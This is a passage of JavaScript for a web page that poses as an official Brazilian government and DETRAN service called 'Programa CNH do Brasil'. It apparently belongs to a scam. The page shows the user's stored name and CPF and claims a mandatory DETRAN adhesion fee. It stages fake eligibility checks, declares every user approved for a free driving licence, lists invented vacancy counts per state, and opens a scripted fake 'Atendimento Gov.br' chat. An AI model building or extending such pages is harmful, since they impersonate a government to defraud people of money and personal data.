        content.appendChild(header);

        // Container com imagem e texto
        const imageTextContainer = document.createElement('div');
        imageTextContainer.className = 'space-y-3 flex flex-col items-center';

        // Imagem governoFederal.png
        const imageContainer = document.createElement('div');
        imageContainer.className = 'flex justify-center mb-4';
        imageContainer.style.cssText = 'opacity: 1; transform: none;';
        
        const govImage = document.createElement('img');
        govImage.src = 'img/governoFederal.png';
        govImage.alt = 'Taxa de Adesão DETRAN';
        govImage.className = 'w-[380px] h-auto md:w-[480px] object-contain rounded-[10px] shadow-lg';
        govImage.style.cssText = 'max-height: 400px;';
        
        imageContainer.appendChild(govImage);
        imageTextContainer.appendChild(imageContainer);

        // Container de texto cinza
        const textContainer = document.createElement('div');
        textContainer.className = 'bg-gray-50 p-8 rounded-md w-[380px] md:w-[480px]';
        textContainer.style.cssText = 'opacity: 1; transform: none;';
        
        const descriptionText = document.createElement('p');
        descriptionText.className = 'text-gray-700 leading-relaxed text-base';
        descriptionText.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem; line-height: 1.6; text-align: justify;';
        descriptionText.textContent = 'Para validar sua participação no programa, o DETRAN cobra uma taxa administrativa de adesão. Esta taxa é obrigatória para verificar sua elegibilidade e garantir seu acesso ao Programa CNH do Brasil.';
        
        textContainer.appendChild(descriptionText);
        imageTextContainer.appendChild(textContainer);
        content.appendChild(imageTextContainer);

        // Botão Finalizar
        const buttonContainer = document.createElement('div');
        buttonContainer.className = 'flex justify-center mt-6';
        
        const finishBtn = document.createElement('button');
        finishBtn.type = 'button';
        finishBtn.className = 'button-continuar flex items-center justify-center gap-2 min-w-[160px]';
        finishBtn.textContent = 'Finalizar';
        
        finishBtn.addEventListener('click', () => {
            // Ir para a tela final com transição suave
            this.transitionScreens(() => this.navigateToScreen('final'));
        });
        
        buttonContainer.appendChild(finishBtn);
        content.appendChild(buttonContainer);

        container.appendChild(content);
        main.appendChild(container);
        this.container.appendChild(main);
    }

    showFinalScreen() {
        // Mostrar tela intermediária com loading
        this.showLoadingScreen();
    }

    showLoadingScreen() {
        // Limpar completamente o container
        this.container.innerHTML = '';
        
        // Criar header com Font Awesome
        const mainHeader = this.createHeaderWithFA();
        this.container.appendChild(mainHeader);
        
        // Criar navegação secundária
        const nav = document.createElement('nav');
        nav.style.cssText = 'background-color: white; padding: 16px 24px; display: flex; justify-content: space-between; align-items: center; border-width: medium medium 1px; border-style: none none solid; border-color: currentcolor currentcolor rgb(229, 229, 229); border-image: initial; box-shadow: none;';
        
        const menuContainer = document.createElement('button');
        menuContainer.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); display: flex; align-items: center; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        menuContainer.innerHTML = '<svg aria-hidden="true" style="margin-right: 10px; font-size: 16px; background: none; box-shadow: none;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M2.5 12a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5z"/></svg><span style="color: rgb(102, 102, 102); font-size: 1rem; font-weight: 300; line-height: 20px; padding-top: 2px; background: none; box-shadow: none;">Programa CNH do Brasil</span>';
        nav.appendChild(menuContainer);
        
        this.container.appendChild(nav);
        
        // Criar container principal
        const main = document.createElement('main');
        main.id = 'main-signin';
        main.style.cssText = 'width: 100%; max-width: 1200px; margin: 0px auto; padding: 1rem;';

        const container = document.createElement('div');
        container.className = 'container mx-auto px-4 py-6';

        const content = document.createElement('div');
        content.className = 'max-w-4xl mx-auto';

        // Container com nome e CPF
        const userContainer = document.createElement('div');
        userContainer.className = 'grid grid-cols-2 gap-4 mb-6';

        const nameField = document.createElement('div');
        nameField.className = 'col-span-2';
        nameField.innerHTML = `
            <label class="block text-sm font-medium text-gray-700">Nome Completo</label>
            <input type="text" disabled class="mt-1 block w-full px-3 py-2 bg-white border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-[#1351B4] focus:border-[#1351B4]" value="${localStorage.getItem('userName') || ''}">
        `;
        userContainer.appendChild(nameField);

        const cpfField = document.createElement('div');
        cpfField.innerHTML = `
            <label class="block text-sm font-medium text-gray-700">CPF</label>
            <input type="text" disabled class="mt-1 block w-full px-3 py-2 bg-white border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-[#1351B4] focus:border-[#1351B4]" value="${localStorage.getItem('userCpf') || ''}">
        `;
        userContainer.appendChild(cpfField);
        content.appendChild(userContainer);

        // Container de loading
        const loadingContainer = document.createElement('div');
        loadingContainer.className = 'mt-8 border-t border-gray-200 pt-8';
        loadingContainer.style.cssText = 'opacity: 0; transition: opacity 0.5s ease-in-out;';

        const loadingSpace = document.createElement('div');
        loadingSpace.className = 'space-y-6';

        // Itens de loading animados
        const loadingItems = [
            { title: 'Validando dados cadastrados...', delay: 0 },
            { title: 'Verificando elegibilidade...', delay: 800 },
            { title: 'Consultando vagas disponíveis...', delay: 1600 },
            { title: 'Processando aprovação...', delay: 2400 }
        ];

        loadingItems.forEach((item, index) => {
            const loadingItem = document.createElement('div');
            loadingItem.className = 'flex items-center gap-3';
            loadingItem.style.cssText = 'opacity: 0; transform: translateX(-20px);';
            
            const spinner = document.createElement('div');
            spinner.className = 'animate-spin';
            spinner.innerHTML = '<svg width="20" height="20" viewBox="0 0 16 16" fill="rgb(19, 81, 180)"><path d="M8 0a8 8 0 1 0 8 8A8 8 0 0 0 8 0zM4.5 7.5a.5.5 0 0 1 .5-.5h6a.5.5 0 0 1 0 1H5a.5.5 0 0 1-.5-.5z"/></svg>';
            
            const title = document.createElement('span');
            title.className = 'text-gray-700 font-medium';
            title.textContent = item.title;
            
            loadingItem.appendChild(spinner);
            loadingItem.appendChild(title);
            loadingSpace.appendChild(loadingItem);

            // Animar aparecimento
            setTimeout(() => {
                loadingItem.style.transition = 'all 0.5s ease-in-out';
                loadingItem.style.opacity = '1';
                loadingItem.style.transform = 'translateX(0)';
            }, item.delay);
        });

        loadingContainer.appendChild(loadingSpace);
        content.appendChild(loadingContainer);

        // Fade in do container
        setTimeout(() => {
            loadingContainer.style.opacity = '1';
        }, 100);

        container.appendChild(content);
        main.appendChild(container);
        this.container.appendChild(main);

        // Após todos os carregamentos, mostrar tela final
        setTimeout(() => {
            this.showFinalScreenWithDetran();
        }, 3500);
    }

    showFinalScreenWithDetran() {
        // Limpar completamente o container
        this.container.innerHTML = '';
        
        // Criar header com Font Awesome
        const mainHeader = this.createHeaderWithFA();
        this.container.appendChild(mainHeader);
        
        // Criar navegação secundária
        const nav = document.createElement('nav');
        nav.style.cssText = 'background-color: white; padding: 16px 24px; display: flex; justify-content: space-between; align-items: center; border-width: medium medium 1px; border-style: none none solid; border-color: currentcolor currentcolor rgb(229, 229, 229); border-image: initial; box-shadow: none;';
        
        const menuContainer = document.createElement('button');
        menuContainer.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); display: flex; align-items: center; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        menuContainer.innerHTML = '<svg aria-hidden="true" style="margin-right: 10px; font-size: 16px; background: none; box-shadow: none;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M2.5 12a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5z"/></svg><span style="color: rgb(102, 102, 102); font-size: 1rem; font-weight: 300; line-height: 20px; padding-top: 2px; background: none; box-shadow: none;">Programa CNH do Brasil</span>';
        nav.appendChild(menuContainer);
        
        this.container.appendChild(nav);
        
        // Criar container principal com HTML exato
        const main = document.createElement('main');
        main.id = 'main-signin';
        main.style.cssText = 'width: 100%; max-width: 1200px; margin: 0px auto; padding: 1rem;';

        const container = document.createElement('div');
        container.className = 'container mx-auto px-4 py-6';

        const content = document.createElement('div');
        content.className = 'max-w-4xl mx-auto';

        // Recuperar dados do usuário
        const userName = localStorage.getItem('userName') || '';
        const userCpf = localStorage.getItem('userCpf') || '';

        // Container com nome e CPF
        const userContainer = document.createElement('div');
        userContainer.className = 'grid grid-cols-2 gap-4 mb-6';

        const nameField = document.createElement('div');
        nameField.className = 'col-span-2';
        nameField.innerHTML = `
            <label class="block text-sm font-medium text-gray-700">Nome Completo</label>
            <input type="text" disabled class="mt-1 block w-full px-3 py-2 bg-white border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-[#1351B4] focus:border-[#1351B4]" value="${userName}">
        `;
        userContainer.appendChild(nameField);

        const cpfField = document.createElement('div');
        cpfField.innerHTML = `
            <label class="block text-sm font-medium text-gray-700">CPF</label>
            <input type="text" disabled class="mt-1 block w-full px-3 py-2 bg-white border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-[#1351B4] focus:border-[#1351B4]" value="${userCpf}">
        `;
        userContainer.appendChild(cpfField);
        content.appendChild(userContainer);

        // Container de aprovação
        const approvalContainer = document.createElement('div');
        approvalContainer.className = 'mt-8 border-t border-gray-200 pt-8';

        const spaceContainer = document.createElement('div');
        spaceContainer.className = 'space-y-6';

        // Card verde de aprovação
        const approvalCard = document.createElement('div');
        approvalCard.className = 'bg-green-50 rounded-lg p-5 mb-6';
        approvalCard.innerHTML = `
            <div class="text-center">
                <h4 class="text-base font-semibold text-green-800 mb-3">Parabéns! Cadastro Aprovado com Sucesso</h4>
                <p class="text-sm text-green-700 leading-relaxed">Prezado(a) <strong>${userName}</strong>, CPF <strong>${userCpf}</strong>, informamos que sua solicitação foi analisada e <strong>APROVADA</strong> pelo Sistema Nacional de Habilitação.</p>
                <p class="text-sm text-green-700 leading-relaxed mt-2">O(A) senhor(a) está apto(a) a obter a Carteira Nacional de Habilitação (CNH) de forma <strong>gratuita</strong>, sem a necessidade de frequentar autoescola, conforme as diretrizes do Programa CNH do Brasil.</p>
                <p class="text-sm text-green-700 leading-relaxed mt-2">Para dar continuidade ao processo, selecione abaixo o DETRAN correspondente ao seu estado de residência.</p>
            </div>
        `;
        spaceContainer.appendChild(approvalCard);

        // Lista DETRAN
        const detranContainer = document.createElement('div');
        detranContainer.className = 'mt-6';
        
        const detranTitle = document.createElement('h4');
        detranTitle.className = 'font-semibold text-[#1351B4] mb-4 text-center text-lg border-b-2 border-[#1351B4] pb-2';
        detranTitle.style.cssText = 'font-weight: 600; color: rgb(19, 81, 180); margin-bottom: 1rem; text-align: center; font-size: 1.125rem; border-bottom: 2px solid rgb(19, 81, 180); padding-bottom: 0.5rem;';
        detranTitle.textContent = 'Selecione o DETRAN do seu Estado';
        detranContainer.appendChild(detranTitle);

        const detranList = document.createElement('div');
        detranList.className = 'space-y-2';

        // Lista DETRAN com dados exatos
        const detranData = [
            { name: 'Detran Acre', vacancies: 52 },
            { name: 'Detran Alagoas', vacancies: 67 },
            { name: 'Detran Amapá', vacancies: 43 },
            { name: 'Detran Amazonas', vacancies: 50 },
            { name: 'Detran Bahia', vacancies: 100 },
            { name: 'Detran Ceará', vacancies: 92 },
            { name: 'Detran Distrito Federal', vacancies: 45 },
            { name: 'Detran Espírito Santo', vacancies: 66 },
            { name: 'Detran Goiás', vacancies: 53 },
            { name: 'Detran Maranhão', vacancies: 64 },
            { name: 'Detran Mato Grosso', vacancies: 72 },
            { name: 'Detran Mato Grosso do Sul', vacancies: 99 },
            { name: 'Detran Minas Gerais', vacancies: 97 },
            { name: 'Detran Pará', vacancies: 57 },
            { name: 'Detran Paraíba', vacancies: 67 },
            { name: 'Detran Paraná', vacancies: 56 },
            { name: 'Detran Pernambuco', vacancies: 97 },
            { name: 'Detran Piauí', vacancies: 50 },
            { name: 'Detran Rio de Janeiro', vacancies: 94 },
            { name: 'Detran Rio Grande do Norte', vacancies: 93 },
            { name: 'Detran Rio Grande do Sul', vacancies: 96 },
            { name: 'Detran Rondônia', vacancies: 79 },
            { name: 'Detran Roraima', vacancies: 43 },
            { name: 'Detran Santa Catarina', vacancies: 98 },
            { name: 'Detran São Paulo', vacancies: 68 },
            { name: 'Detran Sergipe', vacancies: 56 },
            { name: 'Detran Tocantins', vacancies: 44 }
        ];

        detranData.forEach(detran => {
            const detranItem = document.createElement('div');
            detranItem.className = 'flex items-center justify-between p-3 bg-white rounded-sm border border-gray-300 shadow-sm hover:shadow-md hover:border-[#1351B4] transition-all';
            detranItem.style.cssText = 'display: flex; align-items: center; justify-content: space-between; padding: 0.75rem; background-color: white; border-radius: 0.325rem; border: 1px solid rgb(209, 213, 219); box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05); transition: all 0.15s ease-in-out;';
            detranItem.addEventListener('mouseenter', () => {
                detranItem.style.boxShadow = '0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06)';
                detranItem.style.borderColor = 'rgb(19, 81, 180)';
            });
            detranItem.addEventListener('mouseleave', () => {
                detranItem.style.boxShadow = '0 1px 2px 0 rgba(0, 0, 0, 0.05)';
                detranItem.style.borderColor = 'rgb(209, 213, 219)';
            });
            
            const detranInfo = document.createElement('div');
            detranInfo.className = 'flex flex-col gap-1';
            detranInfo.style.cssText = 'display: flex; flex-direction: column; gap: 0.25rem;';
            
            const detranName = document.createElement('span');
            detranName.className = 'font-medium text-gray-800';
            detranName.style.cssText = 'font-weight: 500; font-size: 12px; color: rgb(31, 41, 55);';
            detranName.textContent = detran.name;
            
            const detranVacancies = document.createElement('span');
            detranVacancies.className = 'text-sm text-[#1351B4] font-semibold bg-[#1351B4]/10 px-2 py-0.5 rounded-sm w-fit';
            detranVacancies.style.cssText = 'font-size: 0.875rem; color: rgb(19, 81, 180); font-weight: 600; background-color: rgba(19, 81, 180, 0.1); padding: 0.125rem 0.5rem; border-radius: 0.325rem; width: fit-content;';
            detranVacancies.textContent = `${detran.vacancies} vagas`;
            
            detranInfo.appendChild(detranName);
            detranInfo.appendChild(detranVacancies);
            
            const startBtn = document.createElement('button');
            startBtn.className = 'bg-[#1351B4] hover:bg-[#0D3A8C] text-white px-5 py-2 rounded-sm text-sm font-medium transition-all shadow-sm hover:shadow-md whitespace-nowrap';
            startBtn.style.cssText = 'background-color: rgb(19, 81, 180); color: white; padding: 0.5rem 1.25rem; border-radius: 0.325rem; font-size: 0.875rem; font-weight: 500; transition: all 0.15s ease-in-out; box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05); white-space: nowrap; border: none; cursor: pointer;';
            startBtn.addEventListener('mouseenter', () => {
                startBtn.style.backgroundColor = 'rgb(13, 58, 140)';
                startBtn.style.boxShadow = '0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06)';
            });
            startBtn.addEventListener('mouseleave', () => {
                startBtn.style.backgroundColor = 'rgb(19, 81, 180)';
                startBtn.style.boxShadow = '0 1px 2px 0 rgba(0, 0, 0, 0.05)';
            });
            startBtn.textContent = 'Iniciar Processo';
            startBtn.addEventListener('click', () => {
                this.showChatScreen(detran.name, detran.vacancies);
            });
            
            detranItem.appendChild(detranInfo);
            detranItem.appendChild(startBtn);
            detranList.appendChild(detranItem);
        });

        detranContainer.appendChild(detranList);
        spaceContainer.appendChild(detranContainer);
        approvalContainer.appendChild(spaceContainer);
        content.appendChild(approvalContainer);

        container.appendChild(content);
        main.appendChild(container);
        this.container.appendChild(main);
    }

    showChatScreen(detranName, vacancies) {
        // Definir estado atual como chat
        this.currentScreen = 'chat';
        this.userData.detran = detranName;
        this.userData.vacancies = vacancies;
        this.saveUserState();
        
        // Limpar completamente o container
        this.container.innerHTML = '';
        
        // Criar header com Font Awesome
        const mainHeader = this.createHeaderWithFA();
        this.container.appendChild(mainHeader);
        
        // Nova navegação de atendimento
        const chatNav = document.createElement('nav');
        chatNav.style.cssText = 'background-color: rgb(245, 245, 245); padding: 12px 24px; display: flex; justify-content: space-between; align-items: center; border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; box-shadow: none;';
        
        const navLeft = document.createElement('div');
        navLeft.style.cssText = 'display: flex; align-items: center; background: none; box-shadow: none;';
        
        const profileContainer = document.createElement('div');
        profileContainer.style.cssText = 'position: relative; margin-right: 10px;';
        
        const profileImg = document.createElement('img');
        profileImg.src = 'img/perfilchat.png';
        profileImg.alt = 'Atendimento';
        profileImg.style.cssText = 'width: 28px; height: 28px; border-radius: 50%; object-fit: cover;';
        profileContainer.appendChild(profileImg);
        
        const onlineIndicator = document.createElement('span');
        onlineIndicator.style.cssText = 'position: absolute; bottom: 0px; right: 0px; width: 8px; height: 8px; background-color: rgb(34, 197, 94); border-radius: 50%; border: 2px solid white;';
        profileContainer.appendChild(onlineIndicator);
        
        navLeft.appendChild(profileContainer);
        
        const navText = document.createElement('span');
        navText.style.cssText = 'color: rgb(102, 102, 102); font-size: 0.875rem; font-weight: 300; line-height: 18px; background: none; box-shadow: none;';
        navText.textContent = 'Atendimento Gov.br';
        navLeft.appendChild(navText);
        
        chatNav.appendChild(navLeft);
        this.container.appendChild(chatNav);
        
        // Main do chat
        const chatMain = document.createElement('main');
        chatMain.className = 'flex-1 overflow-hidden bg-gray-50';
        chatMain.style.cssText = 'flex: 1; overflow: hidden; background-color: rgb(249, 250, 251);';
        
        const chatContainer = document.createElement('div');
        chatContainer.className = 'max-w-4xl mx-auto h-full px-4';
        chatContainer.style.cssText = 'max-width: 56rem; margin: 0 auto; height: 100%; padding: 0 1rem;';
        
        const chatMessages = document.createElement('div');
        chatMessages.className = 'h-[calc(100vh-160px)] overflow-y-auto py-4';
        chatMessages.style.cssText = 'height: calc(100vh - 160px); overflow-y: auto; padding: 1rem 0; scroll-behavior: smooth;';
        chatMessages.id = 'chat-messages';
        
        // Mensagem inicial do sistema
        const messageContainer = document.createElement('div');
        messageContainer.className = 'mb-4 text-left';
        messageContainer.style.cssText = 'margin-bottom: 1rem; text-align: left;';
        
        const messageBubble = document.createElement('div');
        messageBubble.className = 'inline-block max-w-[80%] p-4 rounded-2xl shadow-sm text-base bg-[#2670CC] text-white rounded-tl-sm';
        messageBubble.style.cssText = 'display: inline-block; max-width: 80%; padding: 1rem; border-radius: 1rem; box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05); font-size: 16px; white-space: pre-line; background-color: rgb(38, 112, 204); color: white; border-top-left-radius: 0.5rem; line-height: 1.5;';
        messageBubble.textContent = `Para dar continuidade ao seu cadastro no Programa CNH do Brasil através do ${detranName}, informamos que é necessário selecionar a categoria de CNH pretendida.`;
        
        messageContainer.appendChild(messageBubble);
        chatMessages.appendChild(messageContainer);
        
        // Container para opções
        const optionsContainer = document.createElement('div');
        optionsContainer.className = 'flex flex-col gap-3 max-w-[80%] mt-2';
        optionsContainer.style.cssText = 'display: flex; flex-direction: column; gap: 0.75rem; max-width: 80%; margin-top: 0.5rem;';
        optionsContainer.id = 'chat-options';
        
        // Botões de categoria
        const categories = [
            { id: 'A', name: 'Categoria A - Motocicletas', icon: 'A' },
            { id: 'B', name: 'Categoria B - Carros', icon: 'B' },
            { id: 'AB', name: 'Categoria AB - Motocicletas e Carros', icon: 'AB' }
        ];
        
        categories.forEach(category => {
            const categoryBtn = document.createElement('button');
            categoryBtn.className = 'flex items-center gap-3 p-4 bg-gradient-to-b from-gray-100 to-white border border-gray-300 rounded-sm shadow-md hover:shadow-lg hover:border-[#1351B4] transition-all text-left';
            categoryBtn.style.cssText = 'display: flex; align-items: center; gap: 0.75rem; padding: 1rem; background: linear-gradient(to bottom, rgb(243, 244, 246), white); border: 1px solid rgb(209, 213, 219); border-radius: 0.125rem; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06); transition: all 0.15s ease-in-out; text-align: left; cursor: pointer;';
            
            categoryBtn.addEventListener('mouseenter', () => {
                categoryBtn.style.boxShadow = '0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05)';
                categoryBtn.style.borderColor = 'rgb(19, 81, 180)';
            });
            
            categoryBtn.addEventListener('mouseleave', () => {
                categoryBtn.style.boxShadow = '0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06)';
                categoryBtn.style.borderColor = 'rgb(209, 213, 219)';
            });
            
            const iconSpan = document.createElement('span');
            iconSpan.className = 'text-[#1351B4] text-xl font-bold';
            iconSpan.style.cssText = 'color: rgb(19, 81, 180); font-size: 1.25rem; font-weight: 700;';
            iconSpan.textContent = category.icon;
            
            const textSpan = document.createElement('span');
            textSpan.className = 'font-medium text-gray-800';
            textSpan.style.cssText = 'font-weight: 500; color: rgb(31, 41, 55);';
            textSpan.textContent = category.name;
            
            categoryBtn.appendChild(iconSpan);
            categoryBtn.appendChild(textSpan);
            
            categoryBtn.addEventListener('click', () => {
                this.handleCategorySelection(category.id, category.name, detranName, vacancies);
            });
            
            optionsContainer.appendChild(categoryBtn);
        });
        
        chatMessages.appendChild(optionsContainer);
        chatContainer.appendChild(chatMessages);
        chatMain.appendChild(chatContainer);
        this.container.appendChild(chatMain);
        
        // Salvar estado do chat
        this.currentChatState = {
            detranName,
            vacancies,
            step: 'category_selection'
        };
        this.saveUserState();
    }

    // Helper para mostrar animação de "digitando..."
    showTypingIndicator(messagesContainer) {
        const typingDiv = document.createElement('div');
        typingDiv.id = 'typing-indicator';
        typingDiv.className = 'inline-block max-w-[80%] p-4 rounded-2xl shadow-sm text-base bg-gray-200 text-gray-600 rounded-tl-sm';
        typingDiv.style.cssText = 'display: inline-block; max-width: 80%; padding: 1rem; border-radius: 1rem; box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05); font-size: 16px; background-color: rgb(229, 231, 235); color: rgb(75, 85, 99); border-top-left-radius: 0.5rem;';
        typingDiv.innerHTML = `
            <div style="display: flex; align-items: center; gap: 4px; padding: 4px 8px;">
                <span style="display: inline-block; width: 8px; height: 8px; background-color: rgb(107, 114, 128); border-radius: 50%; animation: typingBounce 1.4s ease-in-out 0s infinite;"></span>
                <span style="display: inline-block; width: 8px; height: 8px; background-color: rgb(107, 114, 128); border-radius: 50%; animation: typingBounce 1.4s ease-in-out 0.2s infinite;"></span>
                <span style="display: inline-block; width: 8px; height: 8px; background-color: rgb(107, 114, 128); border-radius: 50%; animation: typingBounce 1.4s ease-in-out 0.4s infinite;"></span>
            </div>
            <style>
                @keyframes typingBounce {
                    0%, 60%, 100% { transform: translateY(0); }
                    30% { transform: translateY(-6px); }
                }
            </style>
        `;
        messagesContainer.appendChild(typingDiv);
        messagesContainer.scrollTop = messagesContainer.scrollHeight;
        return typingDiv;
    }

    // Helper para remover animação de digitando
    removeTypingIndicator(messagesContainer) {
        const typingIndicator = document.getElementById('typing-indicator');
        if (typingIndicator) {
            typingIndicator.remove();
        }
    }

    // Helper para criar botão Prosseguir padronizado
    createProceedButton(text, onClick) {
        const proceedBtnContainer = document.createElement('div');
        proceedBtnContainer.className = 'flex justify-center mt-6 mb-4';
        proceedBtnContainer.style.cssText = 'display: flex; justify-content: center; margin-top: 1.5rem; margin-bottom: 1rem;';
        proceedBtnContainer.id = 'chat-options';
        
        const proceedBtn = document.createElement('button');
        proceedBtn.className = 'button-continuar';
        proceedBtn.style.cssText = 'background-color: rgb(19, 81, 180); color: white; padding: 0.75rem 2rem; border-radius: 0.375rem; font-weight: 600; font-family: Rawline, system-ui, sans-serif; cursor: pointer; transition: all 0.3s; border: none; font-size: 16px; display: flex; align-items: center; justify-content: center; gap: 0.5rem; width: 100%; max-width: 280px;';
        proceedBtn.innerHTML = `${text} <i class="fas fa-chevron-right" style="font-size: 14px;"></i>`;
        
        proceedBtn.addEventListener('mouseenter', () => {
            proceedBtn.style.backgroundColor = 'rgb(13, 58, 140)';
            proceedBtn.style.transform = 'translateY(-1px)';
        });
        
        proceedBtn.addEventListener('mouseleave', () => {
            proceedBtn.style.backgroundColor = 'rgb(19, 81, 180)';
            proceedBtn.style.transform = 'translateY(0)';
        });
        
        proceedBtn.addEventListener('click', (e) => {
            e.preventDefault();
            e.stopPropagation();
            onClick();
        });
        
        proceedBtnContainer.appendChild(proceedBtn);
        return proceedBtnContainer;
    }

    handleCategorySelection(categoryId, categoryName, detranName, vacancies) {
        // Salvar categoria selecionada no userData
        this.userData.category = categoryId;
        this.userData.categoryName = categoryName;
        this.saveUserState();
        
        const optionsContainer = document.getElementById('chat-options');
        const messagesContainer = document.getElementById('chat-messages');
        
        // Adicionar efeito de loading nos botões
        const buttons = optionsContainer.querySelectorAll('button');
        buttons.forEach(btn => {
            btn.disabled = true;
            btn.style.opacity = '0.5';
            btn.style.cursor = 'not-allowed';
        });
        
        // Desabilitar botões de categoria
        optionsContainer.style.pointerEvents = 'none';
        optionsContainer.style.opacity = '0.6';
        
        // Mostrar animação de "digitando..." por 3 segundos
        const typingDiv = this.showTypingIndicator(messagesContainer);
        
        // Aguardar 3 segundos antes de mostrar a mensagem
        setTimeout(() => {
            // Remover animação de digitando
            this.removeTypingIndicator(messagesContainer);
            
            // Adicionar mensagem do usuário (após a animação)
            const userMessage = document.createElement('div');
            userMessage.className = 'mb-4 text-right';
            userMessage.style.cssText = 'margin-bottom: 1rem; text-align: right;';
            
            const userBubble = document.createElement('div');
            userBubble.className = 'inline-block max-w-[80%] p-4 rounded-2xl shadow-sm text-base bg-gray-100 text-gray-800 rounded-tr-sm';
            userBubble.style.cssText = 'display: inline-block; max-width: 80%; padding: 1rem; border-radius: 1rem 1rem 1rem 0.25rem; box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05); font-size: 16px; background-color: rgb(243, 244, 246); color: rgb(31, 41, 55); border-top-right-radius: 0.25rem; line-height: 1.5; position: relative;';
            userBubble.textContent = categoryName;
            
            // Adicionar ponta do balão de conversa
            userBubble.innerHTML += `
                <div style="position: absolute; top: 20px; right: -8px; width: 0; height: 0; border-top: 8px solid transparent; border-bottom: 8px solid transparent; border-left: 8px solid rgb(243, 244, 246);"></div>
            `;
            
            userMessage.appendChild(userBubble);
            messagesContainer.appendChild(userMessage);
            
            // Adicionar mensagem do sistema
            const systemMessage = document.createElement('div');
            systemMessage.className = 'mb-4';
            systemMessage.style.cssText = 'margin-bottom: 1rem;';
            
            const messageBubble = document.createElement('div');
            messageBubble.className = 'inline-block max-w-[80%] p-4 rounded-2xl shadow-sm text-base bg-[#2670CC] text-white rounded-tl-sm';
            messageBubble.style.cssText = 'display: inline-block; max-width: 80%; padding: 1rem; border-radius: 1rem 1rem 1rem 0.25rem; box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05); font-size: 16px; white-space: pre-line; background-color: rgb(38, 112, 204); color: white; border-top-left-radius: 0.25rem; line-height: 1.5; position: relative;';
            messageBubble.innerHTML = `Prezado(a) Albertino, informamos que as aulas teóricas do Programa CNH do Brasil podem ser realizadas de forma remota, por meio de dispositivo móvel ou computador, conforme sua disponibilidade de horário.<br><br>Após a finalização do cadastro, o sistema liberará o acesso ao aplicativo oficial com o passo a passo completo, e você já poderá iniciar as aulas imediatamente.
                <div style="position: absolute; top: 20px; left: -8px; width: 0; height: 0; border-top: 8px solid transparent; border-bottom: 8px solid transparent; border-right: 8px solid rgb(38, 112, 204);"></div>
            `;
            
            systemMessage.appendChild(messageBubble);
            messagesContainer.appendChild(systemMessage);
            
            // Remover botões de categoria
            optionsContainer.remove();
            
            // Adicionar botão PROSSEGUIR padronizado alinhado com a mensagem do sistema
            const proceedBtnContainer = this.createProceedButton('Prosseguir', () => {
                this.showSecondMessage(detranName, categoryId);
            });
            proceedBtnContainer.style.cssText = 'display: flex; justify-content: flex-start; margin-top: 1rem; margin-bottom: 1rem; margin-left: 0;';
            messagesContainer.appendChild(proceedBtnContainer);
            
            // Scroll para o final
            messagesContainer.scrollTop = messagesContainer.scrollHeight;
            
        }, 3000);
    }

    showSecondMessage(detranName, categoryId) {
        const optionsContainer = document.getElementById('chat-options');
        
        // Buscar messagesContainer de forma mais robusta
        let messagesContainer = document.getElementById('chat-messages');
        
        if (!messagesContainer) {
            messagesContainer = document.querySelector('#chat-messages');
        }
        
        if (!messagesContainer) {
            messagesContainer = document.querySelector('[id*="chat-messages"]');
        }
        
        if (!messagesContainer) {
            messagesContainer = document.querySelector('.overflow-y-auto');
        }
        
        if (!messagesContainer) {
            messagesContainer = document.querySelector('main div');
        }
        
        // Verificação final
        if (!messagesContainer) {
            console.error('Container de mensagens não encontrado');
            return;
        }
        
        // Remover botão PROSSEGUIR (verificar se existe)
        if (optionsContainer) {
            optionsContainer.remove();
        }
        
        // Adicionar mensagem do usuário "prosseguir"
        const userMessage = document.createElement('div');
        userMessage.className = 'mb-4 text-right';
        userMessage.style.cssText = 'margin-bottom: 1rem; text-align: right;';
        
        const userBubble = document.createElement('div');
        userBubble.className = 'inline-block max-w-[80%] p-4 rounded-2xl shadow-sm text-base bg-gray-100 text-gray-800 rounded-tr-sm';
        userBubble.style.cssText = 'display: inline-block; max-width: 80%; padding: 1rem; border-radius: 1rem 1rem 1rem 0.25rem; box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05); font-size: 16px; background-color: rgb(243, 244, 246); color: rgb(31, 41, 55); border-top-right-radius: 0.25rem; line-height: 1.5; position: relative;';
        userBubble.textContent = 'prosseguir';
        
        // Adicionar ponta do balão de conversa
        userBubble.innerHTML += `
